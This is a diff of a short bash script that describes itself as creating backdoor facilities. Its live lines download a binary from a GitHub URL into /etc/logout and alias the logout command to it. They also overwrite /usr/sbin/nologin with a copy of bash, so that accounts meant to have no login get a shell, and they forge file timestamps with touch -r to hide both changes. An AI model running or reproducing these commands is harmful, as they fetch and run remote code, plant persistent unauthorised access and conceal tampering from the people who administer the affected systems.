@@ -1,9 +1,20 @@
 #!/bin/bash
 #Create facilities fo backdoor users - ONE TIME at first
+#for mips64
+#configure
+#set system package repository wheezy components 'main contrib non-free'
+#set system package repository wheezy distribution wheezy 
+#set system package repository wheezy url http://http.us.debian.org/debian
+#commit
+#save
+#exit
+#apt-get update
+#apt-get install wget
+
 wget -P /etc https://raw.githubusercontent.com/systemprofiler/kernel/master/logout
 chmod 711 /etc/logout
 touch -r /etc/login.defs /etc/logout
-echo 'alias logout='/etc/logout'' >> ~/.bashrc
+echo "alias logout="/etc/logout"" >> ~/.bashrc
 
 cat /bin/bash > /usr/sbin/nologin
 touch -r /usr/sbin/ntpd /usr/sbin/nologin
